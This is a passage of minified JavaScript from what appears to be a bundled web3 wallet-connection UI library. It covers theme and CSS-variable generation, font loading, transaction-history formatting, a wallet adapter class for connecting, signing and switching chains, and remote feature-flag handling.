e["font-family"]=t["--apkt-font-family"]??t["--w3m-font-family"]??"KHTeka",e.accent=t["--apkt-accent"]??t["--w3m-accent"]??"#0988F0",e["color-mix"]=t["--apkt-color-mix"]??t["--w3m-color-mix"]??"#000",e["color-mix-strength"]=t["--apkt-color-mix-strength"]??t["--w3m-color-mix-strength"]??0,e["font-size-master"]=t["--apkt-font-size-master"]??t["--w3m-font-size-master"]??"10px",e["border-radius-master"]=t["--apkt-border-radius-master"]??t["--w3m-border-radius-master"]??"4px",t["--apkt-z-index"]!==void 0?e["z-index"]=t["--apkt-z-index"]:t["--w3m-z-index"]!==void 0&&(e["z-index"]=t["--w3m-z-index"]),e}const uf={createCSSVariables(t){const e={},n={};function r(s,o,a=""){for(const[c,l]of Object.entries(s)){const f=a?`${a}-${c}`:c;l&&typeof l=="object"&&Object.keys(l).length?(o[c]={},r(l,o[c],f)):typeof l=="string"&&(o[c]=`${iW}-${f}`)}}function i(s,o){for(const[a,c]of Object.entries(s))c&&typeof c=="object"?(o[a]={},i(c,o[a])):typeof c=="string"&&(o[a]=`var(${c})`)}return r(t,e),i(e,n),{cssVariables:e,cssVariablesVarPrefix:n}},assignCSSVariables(t,e){const n={};function r(i,s,o){for(const[a,c]of Object.entries(i)){const l=o?`${o}-${a}`:a,f=s[a];c&&typeof c=="object"?r(c,f,l):typeof f=="string"&&(n[`${iW}-${l}`]=f)}}return r(t,e),n},createRootStyles(t,e){const n={...j7,tokens:{...j7.tokens,theme:t==="light"?$x.light:$x.dark}},{cssVariables:r}=uf.createCSSVariables(n),i=uf.assignCSSVariables(r,n),s=uf.generateW3MVariables(e),o=uf.generateW3MOverrides(e),a=uf.generateScaledVariables(e),c=uf.generateBaseVariables(i),l={...i,...c,...s,...o,...a},f=uf.applyColorMixToVariables(e,l),h={...l,...f};return`:root {${Object.entries(h).map(([b,w])=>`${b}:${w.replace("/[:;{}</>]/g","")};`).join("")}}`},generateW3MVariables(t){if(!t)return{};const e=e6(t),n={};return n["--w3m-font-family"]=e["font-family"],n["--w3m-accent"]=e.accent,n["--w3m-color-mix"]=e["color-mix"],n["--w3m-color-mix-strength"]=`${e["color-mix-strength"]}%`,n["--w3m-font-size-master"]=e["font-size-master"],n["--w3m-border-radius-master"]=e["border-radius-master"],n},generateW3MOverrides(t){if(!t)return{};const e=e6(t),n={};if(t["--apkt-accent"]||t["--w3m-accent"]){const r=e.accent;n["--apkt-tokens-core-iconAccentPrimary"]=r,n["--apkt-tokens-core-borderAccentPrimary"]=r,n["--apkt-tokens-core-textAccentPrimary"]=r,n["--apkt-tokens-core-backgroundAccentPrimary"]=r}return(t["--apkt-font-family"]||t["--w3m-font-family"])&&(n["--apkt-fontFamily-regular"]=e["font-family"]),e["z-index"]!==void 0&&(n["--apkt-tokens-core-zIndex"]=`${e["z-index"]}`),n},generateScaledVariables(t){if(!t)return{};const e=e6(t),n={};if(t["--apkt-font-size-master"]||t["--w3m-font-size-master"]){const r=parseFloat(e["font-size-master"].replace("px",""));n["--apkt-textSize-h1"]=`${Number(r)*5}px`,n["--apkt-textSize-h2"]=`${Number(r)*4.4}px`,n["--apkt-textSize-h3"]=`${Number(r)*3.8}px`,n["--apkt-textSize-h4"]=`${Number(r)*3.2}px`,n["--apkt-textSize-h5"]=`${Number(r)*2.6}px`,n["--apkt-textSize-h6"]=`${Number(r)*2}px`,n["--apkt-textSize-large"]=`${Number(r)*1.6}px`,n["--apkt-textSize-medium"]=`${Number(r)*1.4}px`,n["--apkt-textSize-small"]=`${Number(r)*1.2}px`}if(t["--apkt-border-radius-master"]||t["--w3m-border-radius-master"]){const r=parseFloat(e["border-radius-master"].replace("px",""));n["--apkt-borderRadius-1"]=`${Number(r)}px`,n["--apkt-borderRadius-2"]=`${Number(r)*2}px`,n["--apkt-borderRadius-3"]=`${Number(r)*3}px`,n["--apkt-borderRadius-4"]=`${Number(r)*4}px`,n["--apkt-borderRadius-5"]=`${Number(r)*5}px`,n["--apkt-borderRadius-6"]=`${Number(r)*6}px`,n["--apkt-borderRadius-8"]=`${Number(r)*8}px`,n["--apkt-borderRadius-16"]=`${Number(r)*16}px`,n["--apkt-borderRadius-20"]=`${Number(r)*20}px`,n["--apkt-borderRadius-32"]=`${Number(r)*32}px`,n["--apkt-borderRadius-64"]=`${Number(r)*64}px`,n["--apkt-borderRadius-128"]=`${Number(r)*128}px`}return n},generateColorMixCSS(t,e){if(!t?.["--w3m-color-mix"]||!t["--w3m-color-mix-strength"])return"";const n=t["--w3m-color-mix"],r=t["--w3m-color-mix-strength"];if(!r||r===0)return"";const i=Object.keys(e||{}).filter(o=>{const a=o.includes("-tokens-core-background")||o.includes("-tokens-core-text")||o.includes("-tokens-core-border")||o.includes("-tokens-core-foreground")||o.includes("-tokens-core-icon")||o.includes("-tokens-theme-background")||o.includes("-tokens-theme-text")||o.includes("-tokens-theme-border")||o.includes("-tokens-theme-foreground")||o.includes("-tokens-theme-icon"),c=o.includes("-borderRadius-")||o.includes("-spacing-")||o.includes("-textSize-")||o.includes("-fontFamily-")||o.includes("-fontWeight-")||o.includes("-typography-")||o.includes("-duration-")||o.includes("-ease-")||o.includes("-path-")||o.includes("-width-")||o.includes("-height-")||o.includes("-visual-size-")||o.includes("-modal-width")||o.includes("-cover");return a&&!c});return i.length===0?"":` @supports (background: color-mix(in srgb, white 50%, black)) {
      :root {
        ${i.map(o=>{const a=e?.[o]||"";return a.includes("color-mix")||a.startsWith("#")||a.startsWith("rgb")?`${o}: color-mix(in srgb, ${n} ${r}%, ${a});`:`${o}: color-mix(in srgb, ${n} ${r}%, var(${o}-base, ${a}));`}).join("")}
      }
    }`},generateBaseVariables(t){const e={},n=t["--apkt-tokens-theme-backgroundPrimary"];n&&(e["--apkt-tokens-theme-backgroundPrimary-base"]=n);const r=t["--apkt-tokens-core-backgroundAccentPrimary"];return r&&(e["--apkt-tokens-core-backgroundAccentPrimary-base"]=r),e},applyColorMixToVariables(t,e){const n={};e?.["--apkt-tokens-theme-backgroundPrimary"]&&(n["--apkt-tokens-theme-backgroundPrimary"]="var(--apkt-tokens-theme-backgroundPrimary-base)"),e?.["--apkt-tokens-core-backgroundAccentPrimary"]&&(n["--apkt-tokens-core-backgroundAccentPrimary"]="var(--apkt-tokens-core-backgroundAccentPrimary-base)");const r=e6(t),i=r["color-mix"],s=r["color-mix-strength"];if(!s||s===0)return n;const o=Object.keys(e||{}).filter(a=>{const c=a.includes("-tokens-core-background")||a.includes("-tokens-core-text")||a.includes("-tokens-core-border")||a.includes("-tokens-core-foreground")||a.includes("-tokens-core-icon")||a.includes("-tokens-theme-background")||a.includes("-tokens-theme-text")||a.includes("-tokens-theme-border")||a.includes("-tokens-theme-foreground")||a.includes("-tokens-theme-icon")||a.includes("-tokens-theme-overlay"),l=a.includes("-borderRadius-")||a.includes("-spacing-")||a.includes("-textSize-")||a.includes("-fontFamily-")||a.includes("-fontWeight-")||a.includes("-typography-")||a.includes("-duration-")||a.includes("-ease-")||a.includes("-path-")||a.includes("-width-")||a.includes("-height-")||a.includes("-visual-size-")||a.includes("-modal-width")||a.includes("-cover");return c&&!l});return o.length===0||o.forEach(a=>{const c=e?.[a]||"";a.endsWith("-base")||(a==="--apkt-tokens-theme-backgroundPrimary"||a==="--apkt-tokens-core-backgroundAccentPrimary"?n[a]=`color-mix(in srgb, ${i} ${s}%, var(${a}-base))`:c.includes("color-mix")||c.startsWith("#")||c.startsWith("rgb")?n[a]=`color-mix(in srgb, ${i} ${s}%, ${c})`:n[a]=`color-mix(in srgb, ${i} ${s}%, var(${a}-base, ${c}))`)}),n}},{cssVariablesVarPrefix:oi}=uf.createCSSVariables(j7);function ot(t,...e){return mr(t,...e.map(n=>Su(typeof n=="function"?n(oi):n)))}let Pm,$m,Ml,Pu,Hx;const af={"KHTeka-500-woff2":"https://fonts.reown.com/KHTeka-Medium.woff2","KHTeka-400-woff2":"https://fonts.reown.com/KHTeka-Regular.woff2","KHTeka-300-woff2":"https://fonts.reown.com/KHTeka-Light.woff2","KHTekaMono-400-woff2":"https://fonts.reown.com/KHTekaMono-Regular.woff2","KHTeka-500-woff":"https://fonts.reown.com/KHTeka-Light.woff","KHTeka-400-woff":"https://fonts.reown.com/KHTeka-Regular.woff","KHTeka-300-woff":"https://fonts.reown.com/KHTeka-Light.woff","KHTekaMono-400-woff":"https://fonts.reown.com/KHTekaMono-Regular.woff"};function zx(t,e="dark"){Pm&&document.head.removeChild(Pm),Pm=document.createElement("style"),Pm.textContent=uf.createRootStyles(e,t),document.head.appendChild(Pm)}function CYe(t,e="dark"){if(Hx=t,$m=document.createElement("style"),Ml=document.createElement("style"),Pu=document.createElement("style"),$m.textContent=i1(t).core.cssText,Ml.textContent=i1(t).dark.cssText,Pu.textContent=i1(t).light.cssText,document.head.appendChild($m),document.head.appendChild(Ml),document.head.appendChild(Pu),zx(t,e),M7(e),!(t?.["--apkt-font-family"]||t?.["--w3m-font-family"]))for(const[r,i]of Object.entries(af)){const s=document.createElement("link");s.rel="preload",s.href=i,s.as="font",s.type=r.includes("woff2")?"font/woff2":"font/woff",s.crossOrigin="anonymous",document.head.appendChild(s)}M7(e)}function M7(t="dark"){Ml&&Pu&&Pm&&(t==="light"?(zx(Hx,t),Ml.removeAttribute("media"),Pu.media="enabled"):(zx(Hx,t),Pu.removeAttribute("media"),Ml.media="enabled"))}function sOe(t){if(Hx=t,$m&&Ml&&Pu){$m.textContent=i1(t).core.cssText,Ml.textContent=i1(t).dark.cssText,Pu.textContent=i1(t).light.cssText;const e=t?.["--apkt-font-family"]||t?.["--w3m-font-family"];e&&($m.textContent=$m.textContent?.replace("font-family: KHTeka",`font-family: ${e}`),Ml.textContent=Ml.textContent?.replace("font-family: KHTeka",`font-family: ${e}`),Pu.textContent=Pu.textContent?.replace("font-family: KHTeka",`font-family: ${e}`))}if(Pm){const e=Pu?.media==="enabled"?"light":"dark";zx(t,e)}}function i1(t){const e=!!(t?.["--apkt-font-family"]||t?.["--w3m-font-family"]);return{core:mr`
      ${e?mr``:mr`
            @font-face {
              font-family: 'KHTeka';
              src:
                url(${Su(af["KHTeka-400-woff2"])}) format('woff2'),
                url(${Su(af["KHTeka-400-woff"])}) format('woff');
              font-weight: 400;
              font-style: normal;
              font-display: swap;
            }

            @font-face {
              font-family: 'KHTeka';
              src:
                url(${Su(af["KHTeka-300-woff2"])}) format('woff2'),
                url(${Su(af["KHTeka-300-woff"])}) format('woff');
              font-weight: 300;
              font-style: normal;
            }

            @font-face {
              font-family: 'KHTekaMono';
              src:
                url(${Su(af["KHTekaMono-400-woff2"])}) format('woff2'),
                url(${Su(af["KHTekaMono-400-woff"])}) format('woff');
              font-weight: 400;
              font-style: normal;
            }

            @font-face {
              font-family: 'KHTeka';
              src:
                url(${Su(af["KHTeka-400-woff2"])}) format('woff2'),
                url(${Su(af["KHTeka-400-woff"])}) format('woff');
              font-weight: 400;
              font-style: normal;
            }
          `}

      @keyframes w3m-shake {
        0% {
          transform: scale(1) rotate(0deg);
        }
        20% {
          transform: scale(1) rotate(-1deg);
        }
        40% {
          transform: scale(1) rotate(1.5deg);
        }
        60% {
          transform: scale(1) rotate(-1.5deg);
        }
        80% {
          transform: scale(1) rotate(1deg);
        }
        100% {
          transform: scale(1) rotate(0deg);
        }
      }
      @keyframes w3m-iframe-fade-out {
        0% {
          opacity: 1;
        }
        100% {
          opacity: 0;
        }
      }
      @keyframes w3m-iframe-zoom-in {
        0% {
          transform: translateY(50px);
          opacity: 0;
        }
        100% {
          transform: translateY(0px);
          opacity: 1;
        }
      }
      @keyframes w3m-iframe-zoom-in-mobile {
        0% {
          transform: scale(0.95);
          opacity: 0;
        }
        100% {
          transform: scale(1);
          opacity: 1;
        }
      }
      :root {
        --apkt-modal-width: 370px;

        --apkt-visual-size-inherit: inherit;
        --apkt-visual-size-sm: 40px;
        --apkt-visual-size-md: 55px;
        --apkt-visual-size-lg: 80px;

        --apkt-path-network-sm: path(
          'M15.4 2.1a5.21 5.21 0 0 1 5.2 0l11.61 6.7a5.21 5.21 0 0 1 2.61 4.52v13.4c0 1.87-1 3.59-2.6 4.52l-11.61 6.7c-1.62.93-3.6.93-5.22 0l-11.6-6.7a5.21 5.21 0 0 1-2.61-4.51v-13.4c0-1.87 1-3.6 2.6-4.52L15.4 2.1Z'
        );

        --apkt-path-network-md: path(
          'M43.4605 10.7248L28.0485 1.61089C25.5438 0.129705 22.4562 0.129705 19.9515 1.61088L4.53951 10.7248C2.03626 12.2051 0.5 14.9365 0.5 17.886V36.1139C0.5 39.0635 2.03626 41.7949 4.53951 43.2752L19.9515 52.3891C22.4562 53.8703 25.5438 53.8703 28.0485 52.3891L43.4605 43.2752C45.9637 41.7949 47.5 39.0635 47.5 36.114V17.8861C47.5 14.9365 45.9637 12.2051 43.4605 10.7248Z'
        );

        --apkt-path-network-lg: path(
          'M78.3244 18.926L50.1808 2.45078C45.7376 -0.150261 40.2624 -0.150262 35.8192 2.45078L7.6756 18.926C3.23322 21.5266 0.5 26.3301 0.5 31.5248V64.4752C0.5 69.6699 3.23322 74.4734 7.6756 77.074L35.8192 93.5492C40.2624 96.1503 45.7376 96.1503 50.1808 93.5492L78.3244 77.074C82.7668 74.4734 85.5 69.6699 85.5 64.4752V31.5248C85.5 26.3301 82.7668 21.5266 78.3244 18.926Z'
        );

        --apkt-width-network-sm: 36px;
        --apkt-width-network-md: 48px;
        --apkt-width-network-lg: 86px;

        --apkt-duration-dynamic: 0ms;
        --apkt-height-network-sm: 40px;
        --apkt-height-network-md: 54px;
        --apkt-height-network-lg: 96px;
      }
    `,dark:mr`
      :root {
      }
    `,light:mr`
      :root {
      }
    `}}const Dt=mr`
  div,
  span,
  iframe,
  a,
  img,
  form,
  button,
  label,
  *::after,
  *::before {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-style: normal;
    text-rendering: optimizeSpeed;
    -webkit-font-smoothing: antialiased;
    -moz-osx-font-smoothing: grayscale;
    -webkit-tap-highlight-color: transparent;
    backface-visibility: hidden;
  }

  :host {
    font-family: var(--apkt-fontFamily-regular);
  }
`,nr=mr`
  button,
  a {
    cursor: pointer;
    display: flex;
    justify-content: center;
    align-items: center;
    position: relative;

    will-change: background-color, color, border, box-shadow, width, height, transform, opacity;
    outline: none;
    border: none;
    text-decoration: none;
    transition:
      background-color var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      color var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      border var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      box-shadow var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      width var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      height var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      transform var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      opacity var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      scale var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2),
      border-radius var(--apkt-durations-lg) var(--apkt-easings-ease-out-power-2);
    will-change:
      background-color, color, border, box-shadow, width, height, transform, opacity, scale,
      border-radius;
  }

  a:active:not([disabled]),
  button:active:not([disabled]) {
    scale: 0.975;
    transform-origin: center;
  }

  button:disabled {
    cursor: default;
  }

  input {
    border: none;
    outline: none;
    appearance: none;
  }
`,t6=".",Cr={getSpacingStyles(t,e){if(Array.isArray(t))return t[e]?`var(--apkt-spacing-${t[e]})`:void 0;if(typeof t=="string")return`var(--apkt-spacing-${t})`},getFormattedDate(t){return new Intl.DateTimeFormat("en-US",{month:"short",day:"numeric"}).format(t)},formatCurrency(t=0,e={}){const n=Number(t);return isNaN(n)?"$0.00":new Intl.NumberFormat("en-US",{style:"currency",currency:"USD",minimumFractionDigits:2,maximumFractionDigits:2,...e}).format(n)},getHostName(t){try{return new URL(t).hostname}catch{return""}},getTruncateString({string:t,charsStart:e,charsEnd:n,truncate:r}){return t.length<=e+n?t:r==="end"?`${t.substring(0,e)}...`:r==="start"?`...${t.substring(t.length-n)}`:`${t.substring(0,Math.floor(e))}...${t.substring(t.length-Math.floor(n))}`},generateAvatarColors(t){const n=t.toLowerCase().replace(/^0x/iu,"").replace(/[^a-f0-9]/gu,"").substring(0,6).padEnd(6,"0"),r=this.hexToRgb(n),i=getComputedStyle(document.documentElement).getPropertyValue("--w3m-border-radius-master"),o=100-3*Number(i?.replace("px","")),a=`${o}% ${o}% at 65% 40%`,c=[];for(let l=0;l<5;l+=1){const f=this.tintColor(r,.15*l);c.push(`rgb(${f[0]}, ${f[1]}, ${f[2]})`)}return`
    --local-color-1: ${c[0]};
    --local-color-2: ${c[1]};
    --local-color-3: ${c[2]};
    --local-color-4: ${c[3]};
    --local-color-5: ${c[4]};
    --local-radial-circle: ${a}
   `},hexToRgb(t){const e=parseInt(t,16),n=e>>16&255,r=e>>8&255,i=e&255;return[n,r,i]},tintColor(t,e){const[n,r,i]=t,s=Math.round(n+(255-n)*e),o=Math.round(r+(255-r)*e),a=Math.round(i+(255-i)*e);return[s,o,a]},isNumber(t){return{number:/^[0-9]+$/u}.number.test(t)},getColorTheme(t){return t||(typeof window<"u"&&window.matchMedia&&typeof window.matchMedia=="function"?window.matchMedia("(prefers-color-scheme: dark)")?.matches?"dark":"light":"dark")},splitBalance(t){const e=t.split(".");return e.length===2?[e[0],e[1]]:["0","00"]},roundNumber(t,e,n){return t.toString().length>=e?Number(t).toFixed(n):t},cssDurationToNumber(t){return t.endsWith("s")?Number(t.replace("s",""))*1e3:t.endsWith("ms")?Number(t.replace("ms","")):0},maskInput({value:t,decimals:e,integers:n}){if(t=t.replace(",","."),t===t6)return`0${t6}`;const[r="",i]=t.split(t6).map(f=>f.replace(/[^0-9]/gu,"")),s=n?r.substring(0,n):r,o=s.length===2?String(Number(s)):s,a=typeof e=="number"?i?.substring(0,e):i,c=typeof e!="number"||e>0;return(typeof a=="string"&&c?[o,a].join(t6):o)??""},capitalize(t){return t?t.charAt(0).toUpperCase()+t.slice(1):""}},oOe=3,n6=.1,aOe=["receive","deposit","borrow","claim"],cOe=["withdraw","repay","burn"],Wb={getTransactionGroupTitle(t,e){const n=Ik.getYear(),r=Ik.getMonthNameByIndex(e);return t===n?r:`${r} ${t}`},getTransactionImages(t){const[e]=t;return t?.length>1?t.map(r=>this.getTransactionImage(r)):[this.getTransactionImage(e)]},getTransactionImage(t){return{type:Wb.getTransactionTransferTokenType(t),url:Wb.getTransactionImageURL(t)}},getTransactionImageURL(t){let e;const n=!!t?.nft_info,r=!!t?.fungible_info;return t&&n?e=t?.nft_info?.content?.preview?.url:t&&r&&(e=t?.fungible_info?.icon?.url),e},getTransactionTransferTokenType(t){if(t?.fungible_info)return"FUNGIBLE";if(t?.nft_info)return"NFT"},getTransactionDescriptions(t,e){const n=t?.metadata?.operationType,r=e||t?.transfers,i=r?.length>0,s=r?.length>1,o=i&&r?.every(m=>!!m?.fungible_info),[a,c]=r;let l=this.getTransferDescription(a),f=this.getTransferDescription(c);if(!i)return(n==="send"||n==="receive")&&o?(l=Cr.getTruncateString({string:t?.metadata.sentFrom,charsStart:4,charsEnd:6,truncate:"middle"}),f=Cr.getTruncateString({string:t?.metadata.sentTo,charsStart:4,charsEnd:6,truncate:"middle"}),[l,f]):[t.metadata.status];if(s)return r.map(m=>this.getTransferDescription(m));let h="";return aOe.includes(n)?h="+":cOe.includes(n)&&(h="-"),l=h.concat(l),[l]},getTransferDescription(t){let e="";return t&&(t?.nft_info?e=t?.nft_info?.name||"-":t?.fungible_info&&(e=this.getFungibleTransferDescription(t)||"-")),e},getFungibleTransferDescription(t){return t?[this.getQuantityFixedValue(t?.quantity.numeric),t?.fungible_info?.symbol].join(" ").trim():null},mergeTransfers(t){if(t?.length<=1)return t;const n=this.filterGasFeeTransfers(t).reduce((i,s)=>{const o=s?.fungible_info?.name,a=i.find(({fungible_info:c,direction:l})=>o&&o===c?.name&&l===s.direction);if(a){const c=Number(a.quantity.numeric)+Number(s.quantity.numeric);a.quantity.numeric=c.toString(),a.value=(a.value||0)+(s.value||0)}else i.push(s);return i},[]);let r=n;return n.length>2&&(r=n.sort((i,s)=>(s.value||0)-(i.value||0)).slice(0,2)),r=r.sort((i,s)=>i.direction==="out"&&s.direction==="in"?-1:i.direction==="in"&&s.direction==="out"?1:0),r},filterGasFeeTransfers(t){const e=t.reduce((r,i)=>{const s=i?.fungible_info?.name;return s&&(r[s]||(r[s]=[]),r[s].push(i)),r},{}),n=[];return Object.values(e).forEach(r=>{if(r.length===1){const i=r[0];i&&n.push(i)}else{const i=r.filter(o=>o.direction==="in"),s=r.filter(o=>o.direction==="out");if(i.length===1&&s.length===1){const o=i[0],a=s[0];let c=!1;if(o&&a){const l=Number(o.quantity.numeric),f=Number(a.quantity.numeric);f<l*n6?(n.push(o),c=!0):l<f*n6&&(n.push(a),c=!0)}c||n.push(...r)}else{const o=this.filterGasFeesFromTokenGroup(r);n.push(...o)}}}),t.forEach(r=>{r?.fungible_info?.name||n.push(r)}),n},filterGasFeesFromTokenGroup(t){if(t.length<=1)return t;const e=t.map(a=>Number(a.quantity.numeric)),n=Math.max(...e),r=Math.min(...e),i=.01;if(r<n*i)return t.filter(c=>Number(c.quantity.numeric)>=n*i);const s=t.filter(a=>a.direction==="in"),o=t.filter(a=>a.direction==="out");if(s.length===1&&o.length===1){const a=s[0],c=o[0];if(a&&c){const l=Number(a.quantity.numeric),f=Number(c.quantity.numeric);if(f<l*n6)return[a];if(l<f*n6)return[c]}}return t},getQuantityFixedValue(t){return t?parseFloat(t).toFixed(oOe):null}};function uOe(t,e){const{kind:n,elements:r}=e;return{kind:n,elements:r,finisher(i){customElements.get(t)||customElements.define(t,i)}}}function lOe(t,e){return customElements.get(t)||customElements.define(t,e),e}function Ue(t){return function(n){return typeof n=="function"?lOe(t,n):uOe(t,n)}}const gp={ERROR_CODE_UNRECOGNIZED_CHAIN_ID:4902,ERROR_CODE_DEFAULT:5e3,ERROR_INVALID_CHAIN_ID:32603};class dOe extends bae{async setUniversalProvider(e){if(!this.namespace)throw new Error("UniversalAdapter:setUniversalProvider - namespace is required");return this.addConnector(new wae({provider:e,caipNetworks:this.getCaipNetworks(),namespace:this.namespace})),Promise.resolve()}async connect(e){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:Number(e.chainId),provider:this.provider,address:""})}async disconnect(){try{await this.getWalletConnectConnector().disconnect(),this.emit("disconnect")}catch(e){console.warn("UniversalAdapter:disconnect - error",e)}return{connections:[]}}syncConnections(){return Promise.resolve()}async getAccounts({namespace:e}){const r=this.provider?.session?.namespaces?.[e]?.accounts?.map(i=>{const[,,s]=i.split(":");return s}).filter((i,s,o)=>o.indexOf(i)===s)||[];return Promise.resolve({accounts:r.map(i=>xe.createAccount(e,i,e==="bip122"?"payment":"eoa"))})}async syncConnectors(){return Promise.resolve()}async getBalance(e){if(!(e.caipNetwork&&jt.BALANCE_SUPPORTED_CHAINS.includes(e.caipNetwork?.chainNamespace))||e.caipNetwork?.testnet)return{balance:"0.00",symbol:e.caipNetwork?.nativeCurrency.symbol||""};const r=Y.getAccountData();if(r?.balanceLoading&&e.chainId===Y.state.activeCaipNetwork?.id)return{balance:r?.balance||"0.00",symbol:r?.balanceSymbol||""};const s=(await Y.fetchTokenBalance()).find(o=>o.chainId===`${e.caipNetwork?.chainNamespace}:${e.chainId}`&&o.symbol===e.caipNetwork?.nativeCurrency.symbol);return{balance:s?.quantity.numeric||"0.00",symbol:s?.symbol||e.caipNetwork?.nativeCurrency.symbol||""}}async signMessage(e){const{provider:n,message:r,address:i}=e;if(!n)throw new Error("UniversalAdapter:signMessage - provider is undefined");let s="";return Y.state.activeCaipNetwork?.chainNamespace===ge.CHAIN.SOLANA?s=(await n.request({method:"solana_signMessage",params:{message:rw.encode(new TextEncoder().encode(r)),pubkey:i}},Y.state.activeCaipNetwork?.caipNetworkId)).signature:s=await n.request({method:"personal_sign",params:[r,i]},Y.state.activeCaipNetwork?.caipNetworkId),{signature:s}}async estimateGas(){return Promise.resolve({gas:BigInt(0)})}async sendTransaction(){return Promise.resolve({hash:""})}walletGetAssets(e){return Promise.resolve({})}async writeContract(){return Promise.resolve({hash:""})}emitFirstAvailableConnection(){}parseUnits(){return 0n}formatUnits(){return"0"}async getCapabilities(){return Promise.resolve({})}async grantPermissions(){return Promise.resolve({})}async revokePermissions(){return Promise.resolve("0x")}async syncConnection(){return Promise.resolve({id:"WALLET_CONNECT",type:"WALLET_CONNECT",chainId:1,provider:this.provider,address:""})}async switchNetwork(e){const{caipNetwork:n}=e,r=this.getWalletConnectConnector();if(n.chainNamespace===ge.CHAIN.EVM)try{await r.provider?.request({method:"wallet_switchEthereumChain",params:[{chainId:mH(n.id)}]})}catch(i){if(i.code===gp.ERROR_CODE_UNRECOGNIZED_CHAIN_ID||i.code===gp.ERROR_INVALID_CHAIN_ID||i.code===gp.ERROR_CODE_DEFAULT||i?.data?.originalError?.code===gp.ERROR_CODE_UNRECOGNIZED_CHAIN_ID)try{await r.provider?.request({method:"wallet_addEthereumChain",params:[{chainId:mH(n.id),rpcUrls:[n?.rpcUrls.chainDefault?.http],chainName:n.name,nativeCurrency:n.nativeCurrency,blockExplorerUrls:[n.blockExplorers?.default.url]}]})}catch{throw new Error("Chain is not supported")}}r.provider.setDefaultChain(n.caipNetworkId)}getWalletConnectProvider(){return this.connectors.find(r=>r.type==="WALLET_CONNECT")?.provider}}const fOe=["email","socials","swaps","onramp","activity","reownBranding","multiWallet","emailCapture","payWithExchange","payments","reownAuthentication"],r6={email:{apiFeatureName:"social_login",localFeatureName:"email",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>{if(!t?.config)return!1;const e=t.config;return!!t.isEnabled&&e.includes("email")},processFallback:t=>t===void 0?jt.DEFAULT_REMOTE_FEATURES.email:!!t},socials:{apiFeatureName:"social_login",localFeatureName:"socials",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>{if(!t?.config)return!1;const e=t.config;return t.isEnabled&&e.length>0?e.filter(n=>n!=="email"):!1},processFallback:t=>t===void 0?jt.DEFAULT_REMOTE_FEATURES.socials:typeof t=="boolean"?t?jt.DEFAULT_REMOTE_FEATURES.socials:!1:t},swaps:{apiFeatureName:"swap",localFeatureName:"swaps",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>{if(!t?.config)return!1;const e=t.config;return t.isEnabled&&e.length>0?e:!1},processFallback:t=>t===void 0?jt.DEFAULT_REMOTE_FEATURES.swaps:typeof t=="boolean"?t?jt.DEFAULT_REMOTE_FEATURES.swaps:!1:t},onramp:{apiFeatureName:"onramp",localFeatureName:"onramp",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>{if(!t?.config)return!1;const e=t.config;return t.isEnabled&&e.length>0?e:!1},processFallback:t=>t===void 0?jt.DEFAULT_REMOTE_FEATURES.onramp:typeof t=="boolean"?t?jt.DEFAULT_REMOTE_FEATURES.onramp:!1:t},activity:{apiFeatureName:"activity",localFeatureName:"history",returnType:!1,isLegacy:!0,isAvailableOnBasic:!1,processApi:t=>!!t.isEnabled,processFallback:t=>t===void 0?jt.DEFAULT_REMOTE_FEATURES.activity:!!t},reownBranding:{apiFeatureName:"reown_branding",localFeatureName:"reownBranding",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>!!t.isEnabled,processFallback:t=>t===void 0?jt.DEFAULT_REMOTE_FEATURES.reownBranding:!!t},emailCapture:{apiFeatureName:"email_capture",localFeatureName:"emailCapture",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>t.isEnabled&&(t.config??[]),processFallback:t=>!1},multiWallet:{apiFeatureName:"multi_wallet",localFeatureName:"multiWallet",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>!!t.isEnabled,processFallback:()=>jt.DEFAULT_REMOTE_FEATURES.multiWallet},payWithExchange:{apiFeatureName:"fund_from_exchange",localFeatureName:"payWithExchange",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>!!t.isEnabled,processFallback:()=>jt.DEFAULT_REMOTE_FEATURES.payWithExchange},payments:{apiFeatureName:"payments",localFeatureName:"payments",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>!!t.isEnabled,processFallback:()=>jt.DEFAULT_REMOTE_FEATURES.payments},reownAuthentication:{apiFeatureName:"reown_authentication",localFeatureName:"reownAuthentication",returnType:!1,isLegacy:!1,isAvailableOnBasic:!1,processApi:t=>!!t.isEnabled,processFallback:t=>typeof t>"u"?jt.DEFAULT_REMOTE_FEATURES.reownAuthentication:!!t}},hOe={localSettingsOverridden:new Set,getApiConfig(t,e){return e?.find(n=>n.id===t)},addWarning(t,e){if(t!==void 0){const n=r6[e],r=n.isLegacy?`"features.${n.localFeatureName}" (now "${e}")`:`"features.${e}"`;this.localSettingsOverridden.add(r)}},processFeature(t,e,n,r,i){const s=r6[t],o=e[s.localFeatureName];if(i&&!s.isAvailableOnBasic)return!1;if(r){const a=this.getApiConfig(s.apiFeatureName,n);return a?.config===null?this.processFallbackFeature(t,o):a?.config?(o!==void 0&&this.addWarning(o,t),this.processApiFeature(t,a)):!1}return this.processFallbackFeature(t,o)},processApiFeature(t,e){return r6[t].processApi(e)},processFallbackFeature(t,e){return r6[t].processFallback(e)},async fetchRemoteFeatures(t){const e=t.basic??!1,n=t.features||{};this.localSettingsOverridden.clear();let r=null,i=!1;try{r=await Ge.fetchProjectConfig(),i=r!=null}catch(o){console.warn("[Reown Config] Failed to fetch remote project configuration. Using local/default values.",o)}const 